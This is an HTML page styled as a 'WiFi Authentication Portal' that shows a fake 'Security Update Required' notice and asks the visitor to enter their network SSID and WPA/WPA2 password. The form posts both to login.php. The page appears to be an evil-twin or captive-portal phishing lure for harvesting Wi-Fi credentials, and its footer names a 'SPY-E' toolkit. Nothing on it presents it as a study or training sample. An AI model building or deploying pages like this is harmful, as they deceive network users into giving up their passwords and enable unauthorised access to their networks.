<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: radial-gradient(circle at top right, #1e293b, #0f172a); min-height: 100vh; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body class="flex items-center justify-center p-6 text-slate-200">
    <div class="glass w-full max-w-md p-8 rounded-3xl shadow-2xl">
        <div class="text-center mb-8">
            <div class="inline-block p-3 bg-blue-500/20 rounded-2xl mb-4">
                <svg class="w-8 h-8 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"></path></svg>
            </div>
            <h1 class="text-2xl font-bold tracking-tight">Security Update Required</h1>
            <p class="text-slate-400 mt-2 text-sm">Verify your network credentials to continue</p>
        </div>

        <form action="login.php" method="POST" class="space-y-6">
            <div>
                <label class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Network SSID</label>
                <input type="text" name="ssid" required placeholder="Example: Home_WiFi_Plus" 
                       class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500/50 transition-all">
            </div>
            <div>
                <label class="block text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">WPA/WPA2 Password</label>
                <input type="password" name="password" required placeholder="••••••••" 
                       class="w-full bg-slate-800/50 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500/50 transition-all">
            </div>
            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl shadow-lg shadow-blue-900/20 transition-all transform active:scale-95">
                Verify & Connect
            </button>
        </form>

        <div class="mt-8 pt-6 border-t border-slate-700/50 text-center">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest">Powered by SPY-E Secure Protocol</p>
        </div>
    </div>
</body>
</html>
